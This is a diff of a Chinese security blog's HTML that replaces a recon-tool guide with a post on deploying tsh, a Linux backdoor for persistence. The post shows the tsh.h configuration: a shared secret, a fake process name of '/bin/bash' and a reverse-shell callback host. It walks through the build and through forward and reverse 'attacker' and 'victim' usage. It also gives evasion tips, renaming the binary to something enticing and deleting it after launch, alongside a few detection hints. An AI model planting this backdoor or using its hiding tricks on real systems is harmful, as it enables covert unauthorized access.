@@ -19,9 +19,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>cSubsidiary和cDomain使用指南 - cances</title>
+  <title>tsh - cances</title>
   
-    <meta name="keywords" content="爬虫,工具指南,信息收集">
+    <meta name="keywords" content="linux,权限维持">
   
 
   
@@ -447,7 +447,7 @@
     
     
       <h1 class="title">
-        cSubsidiary和cDomain使用指南
+        tsh
       </h1>
       <div class='new-meta-box'>
         
@@ -456,7 +456,7 @@
   <div class='new-meta-item category'>
     <a class='notlink'>
       <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+      <a class="category-link" href="/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">权限维持</a>
     </a>
   </div>
 
@@ -467,7 +467,7 @@
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2021年3月1日</p>
+    <p>发布于：2021年1月30日</p>
   </a>
 </div>
 
@@ -478,7 +478,7 @@
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="cSubsidiary和cDomain使用指南" data-path="/2021/03/01/cSubsidiary%E5%92%8CcDomain%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">
+      <div id="lc-pv" data-title="tsh" data-path="/2021/01/30/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -495,15 +495,43 @@
 
 
   
-  <p>github地址：<a target="_blank" rel="noopener" href="https://github.com/canc3s/cSubsidiary">cSubsidiary</a>和<a target="_blank" rel="noopener" href="https://github.com/canc3s/cDomain">cDomain</a></p>
+  <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/orangetw/tsh">https://github.com/orangetw/tsh</a></p>
+<p>功能：</p>
 <blockquote>
-<p>不管是打比赛还是src，天眼查都是整理资产的利器。。。</p>
+<p>通信加密</p>
+<p>支持上传、下载、直接反弹shell</p>
 </blockquote>
-<h2 id="查询多级子公司"><a href="#查询多级子公司" class="headerlink" title="查询多级子公司"></a>查询多级子公司</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cSubsidiary_darwin_amd64 -n 字节跳动 -p 49 -w 0 -o Subsidiary.txt &amp;&amp; ./cSubsidiary_darwin_amd64 -f Subsidiary.txt</span><br></pre></td></tr></table></figure>
-<h2 id="批量查询子公司域名"><a href="#批量查询子公司域名" class="headerlink" title="批量查询子公司域名"></a>批量查询子公司域名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cSubsidiary_darwin_amd64 -n 字节跳动 -o Subsidiary.txt &amp;&amp; ./cDomain_darwin_amd64 -f Subsidiary.txt</span><br></pre></td></tr></table></figure>
-<h2 id="携带cookie"><a href="#携带cookie" class="headerlink" title="携带cookie"></a>携带cookie</h2><p>因为cookie有效时间很长，而且cookie又很长，所以可以这样去使用。</p>
-<h3 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie=<span class="string">&quot;TYCID=d167e900387111ebb03dc06df; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22.....&quot;</span></span><br><span class="line">./cSubsidiary_darwin_amd64 -n 字节跳动 -o Subsidiary.txt -c <span class="variable">$Cookie</span> &amp;&amp; ./cDomain_darwin_amd64 -f Subsidiary.txt -c <span class="variable">$Cookie</span></span><br></pre></td></tr></table></figure>
-<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> Cookie=<span class="string">&quot;TYCID=d167e900387111ebb03dc06df; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22.....&quot;</span></span><br><span class="line">cSubsidiary.exe -n 字节跳动 -o Subsidiary.txt -c %Cookie% &amp;&amp; cDomain.exe -f Subsidiary.txt -c %Cookie%</span><br></pre></td></tr></table></figure>
+<p>tsh.h文件，用来配置生成的tsh</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *secret = <span class="string">&quot;rc9c0r0e72t5ag0pl79a75c54r1d&quot;</span>;  <span class="comment">//加密密码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 8888                                                <span class="comment">//SERVER端口</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAKE_PROC_NAME <span class="meta-string">&quot;/bin/bash&quot;</span>                          <span class="comment">//进程名</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_HOST  <span class="meta-string">&quot;10.0.0.8&quot;</span>                       <span class="comment">//反连ip</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_DELAY 60                                       <span class="comment">//反连周期</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure>
+<p>编译tsh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#可选平台</span><br><span class="line">#linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf</span><br><span class="line"></span><br><span class="line">make linux</span><br></pre></td></tr></table></figure>
+<h2 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h2><p>编译tshd时下面两行必须注释</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#define CONNECT_BACK_HOST  &quot;10.0.0.8&quot;                     //反连ip</span></span><br><span class="line"><span class="comment">//#define CONNECT_BACK_DELAY 60                                     //反连周期</span></span><br></pre></td></tr></table></figure>
+<p>被控端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tshd</span><br></pre></td></tr></table></figure>
+<p>netstat 这边没什么异样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/76c811adbd7a712bf7a01e536ed1f0dc456.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/76c811adbd7a712bf7a01e536ed1f0dc456.png" srcset="data:image/png;base64,666" alt="image-20210203190049116"></p>
+<p>lsof 可以看到执行的进程是 <code>tshd</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/996074455491ce211cd5e2a73fe99579575.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/996074455491ce211cd5e2a73fe99579575.png" srcset="data:image/png;base64,666" alt="image-20210203190204830"></p>
+<p>所以运行时可以改个诱惑性的名字,运行完之后可以直接删除文件。不影响后面的使用，除非进程被清理掉或者系统关机。</p>
+<p>看看<code>ps -ef</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/025bc3ffccecc83db689093294a43ccb041.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/025bc3ffccecc83db689093294a43ccb041.png" srcset="data:image/png;base64,666" alt="image-20210203190533288"></p>
+<p>攻击者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh 被控端ip</span><br></pre></td></tr></table></figure>
+<h2 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h2><p>不需要注释，直接编译。</p>
+<p>被控端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tshd</span><br></pre></td></tr></table></figure>
+<p>netstat 也没有什么异样</p>
+<p>看看<code>ps -ef</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c14803fbbc9f321bfe5ac45b5d890a66104.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c14803fbbc9f321bfe5ac45b5d890a66104.png" srcset="data:image/png;base64,666" alt="image-20210203191412371"></p>
+<p>运行完之后也是可以直接删除文件。</p>
+<p>攻击者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tsh cb</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>默认配置的<code>tsh</code>有两个特点，一是进程名为<code>/bin/bash</code>，用<code>ps -ef</code>看其实挺突兀的，很容易辨别。二是父进程pid是1。</li>
+<li>还有一个识别的技巧就是用<code>netstat</code>, <code>ps -ef</code>, <code>lsof</code> 几个工具都试试结果对比一下，排除出来的概率还是比较大的。所以做攻击也是需要去思考。</li>
+<li>为了通信过程的安全，作者建议 <code>secret</code> 最好多于12位，只要 <code>secret</code> 一致，<code>tsh</code> 和 <code>tshd</code> 就可以通信。也就是说，<code>secret</code> 太弱，可以爆破出来（但不知道好不好实现，看看<code>tshd</code>有没有特别的指纹）</li>
+</ol>
 
   
   
@@ -521,7 +549,7 @@
               
             
               
-                <p>本文永久链接是：<a href=https://canc3s.github.io/2021/03/01/cSubsidiary%E5%92%8CcDomain%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/>https://canc3s.github.io/2021/03/01/cSubsidiary%E5%92%8CcDomain%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</a></p>
+                <p>本文永久链接是：<a href=https://canc3s.github.io/2021/01/30/>https://canc3s.github.io/2021/01/30/</a></p>
               
             
           </blockquote>
@@ -540,7 +568,7 @@
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E7%88%AC%E8%99%AB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>爬虫</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>工具指南</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>信息收集</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/linux/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>linux</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>权限维持</p></a></div>
 
 
         
@@ -553,7 +581,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://canc3s.github.io/2021/03/01/cSubsidiary%E5%92%8CcDomain%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/&title=cSubsidiary和cDomain使用指南 - cances&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://canc3s.github.io/2021/01/30/&title=tsh - cances&summary="
           
           >
           
@@ -565,7 +593,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://canc3s.github.io/2021/03/01/cSubsidiary%E5%92%8CcDomain%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/&title=cSubsidiary和cDomain使用指南 - cances&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://canc3s.github.io/2021/01/30/&title=tsh - cances&summary="
           
           >
           
@@ -577,7 +605,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://canc3s.github.io/2021/03/01/cSubsidiary%E5%92%8CcDomain%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/&title=cSubsidiary和cDomain使用指南 - cances&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://canc3s.github.io/2021/01/30/&title=tsh - cances&summary="
           
           >
           
@@ -589,7 +617,7 @@
       
         <a class="-mob-share-telegram" title="" rel="external nofollow noopener noreferrer noopener"
           
-            target="_blank" href="https://t.me/share/url?url=https://canc3s.github.io/2021/03/01/cSubsidiary%E5%92%8CcDomain%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/&text=cSubsidiary和cDomain使用指南 - cances"
+            target="_blank" href="https://t.me/share/url?url=https://canc3s.github.io/2021/01/30/&text=tsh - cances"
           
           >
           
@@ -615,17 +643,21 @@
   
     <div class="prev-next">
       
+        <a class='prev' href='/2021/03/01/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>cSubsidiary和cDomain使用指南</p>
+          <p class='content'>github地址：cSubsidiary和cDomain
+
+不管是打比赛还是src，天眼查都是整理资产的利器。。。
+
+查询多级子公司1./cSubsidiary_darwin_amd64 -n ...</p>
+        </a>
       
-        <a class='next' href='/2021/01/30/tsh/'>
-          <p class='title'>tsh<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>介绍下载地址：https://github.com/orangetw/tsh
-功能：
+      
+        <a class='next' href='/2021/01/26/'>
+          <p class='title'>1月内部红蓝<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>1月内部红蓝代码审计看到网站直接试admin就进后台了，然后上github找到了PbootCMS项目，尝试默认口令，admin:123456就进后台了。考点肯定不是这个。。。
 
-通信加密
-支持上传、下载、直接反弹shell
-
-tsh.h文件，用来配置生成的tsh
-1234567891...</p>
+后来群里有人说有...</p>
         </a>
       
     </div>
@@ -668,7 +700,7 @@ tsh.h文件，用来配置生成的tsh
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%A4%9A%E7%BA%A7%E5%AD%90%E5%85%AC%E5%8F%B8"><span class="toc-text">查询多级子公司</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%85%AC%E5%8F%B8%E5%9F%9F%E5%90%8D"><span class="toc-text">批量查询子公司域名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%BA%E5%B8%A6cookie"><span class="toc-text">携带cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mac"><span class="toc-text">mac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91"><span class="toc-text">正向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%90%91"><span class="toc-text">反向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
     </div>
   </section>
 
@@ -688,7 +720,7 @@ tsh.h文件，用来配置生成的tsh
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="cSubsidiary和cDomain使用指南";
+  pdata.postTitle="tsh";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
